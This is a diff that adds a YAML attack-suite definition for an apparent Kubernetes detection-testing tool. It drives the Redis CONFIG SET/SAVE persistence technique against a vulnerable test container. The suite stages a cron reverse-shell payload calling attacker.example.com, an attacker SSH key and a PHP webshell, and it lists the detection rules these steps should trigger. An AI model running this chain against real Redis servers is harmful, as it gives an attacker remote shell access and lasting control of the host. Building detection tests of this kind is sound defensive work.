@@ -1,0 +1,181 @@
+apiVersion: bobctl.k8sstormcenter.io/v1alpha1
+kind: AttackSuite
+metadata:
+  name: redis-e2e-03-config-save-cron-persistence
+  description: >-
+    E2E breach scenario 3 — "CONFIG SET + SAVE cron/SSH persistence". The
+    evergreen Redis exploit technique: point `dir` at a filesystem location
+    that the Redis process can write to, store a crafted payload as a
+    single key, set `dbfilename` to the target filename, then SAVE — Redis
+    happily writes the RDB (with the payload sandwiched inside Redis's own
+    header) to the chosen path. Depending on directory, this ends up as a
+    cron job, SSH authorized_keys, or a webshell.
+
+    Modeled after:
+      - Hackviser Redis pentesting cheat sheet — canonical webshell / cron
+        / SSH-key patterns
+        https://hackviser.com/tactics/pentesting/services/redis
+      - Trend Micro — exposed Redis instances abused for RCE and
+        cryptocurrency mining in the wild
+        https://www.trendmicro.com/en_us/research/20/d/exposed-redis-instances-abused-for-remote-code-execution-cryptocurrency-mining.html
+      - jas502n/Redis-RCE reference implementation
+        https://github.com/jas502n/Redis-RCE
+
+    In the redis-vulnerable image the container runs as the `redis` user
+    in a read-mostly filesystem, so these writes will fail at the OS layer
+    — which is exactly the defensive signal we want. The RESP command
+    sequence, the attempted open() of /var/spool/cron/crontabs, and the
+    write error in the redis-server log are each a detectable footprint.
+
+    We exercise THREE persistence targets so a defender that only rules on
+    one directory (e.g. /root/.ssh) does not pass by accident.
+
+    Recovery: every step resets dir + dbfilename + removes the staging
+    key, so the instance is left in the same state as it started.
+target:
+  service: redis
+  namespace: redis
+  port: 6379
+  protocol: redis
+
+attacks:
+  # ── Phase 0: Recon current persistence config ────────────────────────────
+  - name: persist-recon-dir
+    type: custom
+    redis:
+      command: ["CONFIG", "GET", "dir"]
+    successIndicators:
+      - responseContains: "dir"
+
+  - name: persist-recon-save
+    type: custom
+    redis:
+      command: ["CONFIG", "GET", "save"]
+
+  # ── Phase 1: Cron persistence ────────────────────────────────────────────
+  # Flush first because SAVE writes the full dataset — a small file is
+  # less likely to hit file-size quotas and lines before the payload
+  # corrupt the crontab.
+  - name: persist-cron-flush
+    type: custom
+    redis:
+      command: ["FLUSHALL"]
+    successIndicators:
+      - responseContains: "OK"
+
+  # The classic newline-wrapped reverse-shell crontab payload.
+  - name: persist-cron-stage-payload
+    type: custom
+    redis:
+      command:
+        - "SET"
+        - "payload"
+        - "\n\n*/1 * * * * bash -i >& /dev/tcp/attacker.example.com/4444 0>&1\n\n"
+    successIndicators:
+      - responseContains: "OK"
+
+  - name: persist-cron-set-dir
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dir", "/var/spool/cron/crontabs"]
+
+  - name: persist-cron-set-dbfilename
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dbfilename", "root"]
+
+  # SAVE here attempts to write /var/spool/cron/crontabs/root. Expected to
+  # fail with a permission error on a hardened image — that failed open()
+  # is the footprint.
+  - name: persist-cron-save
+    type: custom
+    redis:
+      command: ["SAVE"]
+
+  # ── Phase 2: SSH key persistence ─────────────────────────────────────────
+  - name: persist-ssh-flush
+    type: custom
+    redis:
+      command: ["FLUSHALL"]
+
+  - name: persist-ssh-stage-key
+    type: custom
+    redis:
+      command:
+        - "SET"
+        - "payload"
+        - "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC_ATTACKER_FAKE_KEY_FOR_BOB_TEST bob-e2e-03@attacker\n\n"
+
+  - name: persist-ssh-set-dir
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dir", "/root/.ssh"]
+
+  - name: persist-ssh-set-dbfilename
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dbfilename", "authorized_keys"]
+
+  - name: persist-ssh-save
+    type: custom
+    redis:
+      command: ["SAVE"]
+
+  # ── Phase 3: Webshell persistence ────────────────────────────────────────
+  - name: persist-webshell-flush
+    type: custom
+    redis:
+      command: ["FLUSHALL"]
+
+  - name: persist-webshell-stage-payload
+    type: custom
+    redis:
+      command:
+        - "SET"
+        - "payload"
+        - "<?php system($_REQUEST['cmd']); ?>"
+
+  - name: persist-webshell-set-dir
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dir", "/var/www/html"]
+
+  - name: persist-webshell-set-dbfilename
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dbfilename", "shell.php"]
+
+  - name: persist-webshell-save
+    type: custom
+    redis:
+      command: ["SAVE"]
+
+  # ── Phase 4: Restore defaults ────────────────────────────────────────────
+  - name: persist-restore-dir
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dir", "/data"]
+
+  - name: persist-restore-dbfilename
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dbfilename", "dump.rdb"]
+
+  - name: persist-restore-flush
+    type: custom
+    redis:
+      command: ["FLUSHALL"]
+
+expectedDetections:
+  # The SAVE attempts trigger open() + write() against paths that the
+  # benign profile never touched — /var/spool/cron/crontabs,
+  # /root/.ssh/authorized_keys, /var/www/html. These fire sensitive-file
+  # and/or open-tracer rules.
+  - attackType: custom
+    ruleID: R0010
+    ruleName: "Unexpected Sensitive File Access"
+    containerName: redis
+  - attackType: custom
+    ruleID: R0003
+    ruleName: "Syscalls Anomalies in container"
+    containerName: redis
